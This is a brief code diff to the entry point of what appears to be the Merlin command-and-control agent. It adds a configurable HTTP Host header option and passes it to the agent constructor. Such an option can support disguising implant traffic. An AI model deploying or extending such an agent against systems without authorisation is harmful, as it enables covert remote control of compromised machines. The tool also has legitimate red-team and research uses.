@@ -37,6 +37,7 @@ var url = "https://127.0.0.1:443"
 var build = "nonRelease"
 var psk = "merlin"
 var proxy = ""
+var host = ""
 
 func main() {
 	verbose := flag.Bool("v", false, "Enable verbose output")
@@ -46,6 +47,7 @@ func main() {
 	flag.StringVar(&psk, "psk", psk, "Pre-Shared Key used to encrypt initial communications")
 	protocol := flag.String("proto", "h2", "Protocol for the agent to connect with [h2, hq, https/1.1]")
 	flag.StringVar(&proxy, "proxy", proxy, "Hardcoded proxy to use for http/1.1 traffic only that will override host configuration")
+	flag.StringVar(&host, "host", host, "HTTP Host header")
 	sleep := flag.Duration("sleep", 30000*time.Millisecond, "Time for agent to sleep")
 	flag.Usage = usage
 	flag.Parse()
@@ -57,7 +59,7 @@ func main() {
 	}
 
 	// Setup and run agent
-	a, err := agent.New(*protocol, url, psk, proxy, *verbose, *debug)
+	a, err := agent.New(*protocol, url, host, psk, proxy, *verbose, *debug)
 	if err != nil {
 		if *verbose {
 			color.Red(err.Error())
